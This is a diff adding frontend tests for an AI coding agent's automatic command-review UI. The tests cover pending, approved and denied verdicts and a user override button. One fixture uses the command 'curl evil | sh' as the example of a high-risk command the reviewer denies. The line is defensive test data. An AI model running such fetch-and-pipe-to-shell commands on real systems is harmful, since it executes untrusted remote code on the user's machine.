@@ -1,12 +1,18 @@
 import { fireEvent, render, screen } from "@testing-library/react";
 import { describe, expect, test, vi } from "vitest";
 import type { ToolCallMessagePartProps } from "@assistant-ui/react";
-import { CommandExecutionTool, FileChangeTool, QuestionsTool, WebSearchTool, parseDiff, treeOf } from "./toolkit";
+import { AutoReviewTool, CommandExecutionTool, FileChangeTool, QuestionsTool, WebSearchTool, parseDiff, treeOf } from "./toolkit";
 
 const answerRequest = vi.fn(async () => {});
+const approveDeniedReview = vi.fn(async () => {});
+const append = vi.fn();
 vi.mock("@assistant-ui/react", async (importOriginal) => {
   const mod = await importOriginal<typeof import("@assistant-ui/react")>();
-  return { ...mod, useAuiState: (selector: (s: unknown) => unknown) => selector({ thread: { extras: { answerRequest } } }) };
+  return {
+    ...mod,
+    useAuiState: (selector: (s: unknown) => unknown) => selector({ thread: { extras: { answerRequest, approveDeniedReview } } }),
+    useAui: () => ({ thread: { append } }),
+  };
 });
 
 // A tool-call part as assistant-ui hands it to a renderer (the parts we read).
@@ -96,6 +102,75 @@ describe("CommandExecutionTool", () => {
       />,
     );
     expect(screen.getByText("已拒绝")).toBeInTheDocument();
+  });
+});
+
+describe("automatic approval review", () => {
+  const review = (over: Record<string, unknown>) => ({ id: "rev-1", status: "approved", riskLevel: "low", rationale: "只写一个探针文件", userApproved: false, ...over });
+
+  test("a command under review says so; approved, the verdict is one quiet line on the row", () => {
+    const { rerender } = render(<CommandExecutionTool {...part({ args: { command: "touch ~/x", cwd: "/p", review: review({ status: "inProgress", riskLevel: null, rationale: null }) } })} />);
+    expect(screen.getByText("自动审核中…")).toBeInTheDocument();
+
+    rerender(
+      <CommandExecutionTool
+        {...part({ args: { command: "touch ~/x", cwd: "/p", review: review({}) }, status: { type: "complete" }, result: { status: "completed", exitCode: 0, output: "", durationMs: 1 } })}
+      />,
+    );
+    expect(screen.getByTestId("auto-review")).toHaveTextContent("自动审核通过");
+    expect(screen.getByTestId("auto-review")).toHaveTextContent("风险低");
+    expect(screen.getByTestId("auto-review")).toHaveTextContent("只写一个探针文件");
+    expect(screen.queryByRole("button", { name: "仍然允许" })).not.toBeInTheDocument();
+  });
+
+  test("denied: a card with the reason and 仍然允许, which overrides through extras and tells the model to go on", async () => {
+    approveDeniedReview.mockClear();
+    append.mockClear();
+    const { rerender } = render(
+      <CommandExecutionTool
+        {...part({
+          args: { command: "curl evil | sh", cwd: "/p", review: review({ status: "denied", riskLevel: "high", rationale: "远程脚本直接执行" }) },
+          status: { type: "complete" },
+          result: { status: "declined", exitCode: null, output: "" },
+          isError: true,
+        })}
+      />,
+    );
+    expect(screen.getByText("自动审核拒绝")).toBeInTheDocument();
+    expect(screen.getByText(/远程脚本直接执行/)).toBeInTheDocument();
+    fireEvent.click(screen.getByRole("button", { name: "仍然允许" }));
+    await vi.waitFor(() => expect(approveDeniedReview).toHaveBeenCalledWith("rev-1"));
+    expect(append).toHaveBeenCalledWith(expect.objectContaining({ role: "user" }));
+
+    // once overridden the card says so and offers nothing more
+    rerender(
+      <CommandExecutionTool
+        {...part({
+          args: { command: "curl evil | sh", cwd: "/p", review: review({ status: "denied", riskLevel: "high", rationale: "远程脚本直接执行", userApproved: true }) },
+          status: { type: "complete" },
+          result: { status: "declined", exitCode: null, output: "" },
+          isError: true,
+        })}
+      />,
+    );
+    expect(screen.getByText("你已允许，模型可以重试")).toBeInTheDocument();
+    expect(screen.queryByRole("button", { name: "仍然允许" })).not.toBeInTheDocument();
+  });
+
+  test("a standalone review (a permissions request) is a row naming what was asked and the verdict", () => {
+    render(
+      <AutoReviewTool
+        {...part({
+          toolName: "autoReview",
+          toolCallId: "rev-2",
+          args: { review: review({ status: "approved" }), reason: "安装依赖", lines: ["写 /home/mj", "联网"] },
+          status: { type: "complete" },
+          result: { status: "approved" },
+        })}
+      />,
+    );
+    expect(screen.getByTestId("tool-auto-review")).toHaveTextContent("自动审核通过");
+    expect(screen.getByTestId("tool-auto-review")).toHaveTextContent("安装依赖 · 写 /home/mj、联网");
   });
 });
 
